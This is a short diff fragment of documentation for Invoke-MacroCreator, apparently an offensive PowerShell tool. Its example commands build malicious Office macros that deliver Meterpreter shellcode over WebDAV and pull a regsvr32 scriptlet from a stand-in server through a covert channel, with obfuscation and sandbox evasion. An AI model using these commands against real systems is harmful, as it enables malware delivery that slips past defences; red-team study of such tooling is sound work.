@@ -19,3 +19,5 @@ C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdav
 # Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:
 C:\PS> Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
 ```
+
+
